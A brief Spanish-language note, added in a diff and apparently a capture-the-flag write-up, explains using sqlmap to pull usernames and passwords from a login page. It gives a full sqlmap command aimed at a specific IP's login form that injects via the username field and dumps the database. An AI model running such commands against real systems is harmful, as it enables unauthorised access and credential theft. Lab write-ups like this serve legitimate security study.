@@ -1,0 +1,7 @@
+en este asemos uso de sqlmap
+para traer el username and password correctos
+
+sqlmap -u http://34.74.105.127/b46f4bc080/login --data "username=a&password=b" -p username --dump
+
+de esta forma traermos los datos correspondientes
+y lisyo
